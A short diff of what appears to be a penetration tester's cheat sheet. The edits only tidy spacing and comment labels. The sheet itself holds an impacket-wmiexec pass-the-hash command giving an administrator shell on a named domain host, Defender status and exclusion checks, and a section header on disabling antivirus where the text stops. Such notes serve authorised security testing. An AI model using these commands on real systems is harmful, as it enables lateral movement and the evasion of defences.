@@ -1,5 +1,5 @@
 # Launch powershell wmiexec to target using PTH
-impacket-wmiexec  administrator@zph-svrcdc01 -hashes :ntlm-hash -shell-type powershell
+impacket-wmiexec administrator@zph-svrcdc01 -hashes :ntlm-hash -shell-type powershell
 
 # show AV status (powershell)
 Get-MpComputerStatus
@@ -7,7 +7,7 @@ Get-MpComputerStatus
 # show AV status (cmd)
 powershell -c 'Get-MpComputerStatus'
 
-# check exclusions
+# check exclusions (powershell)
 Get-MpPreference | select Exclusion* | fl
 
 # Disable AV (powershell)
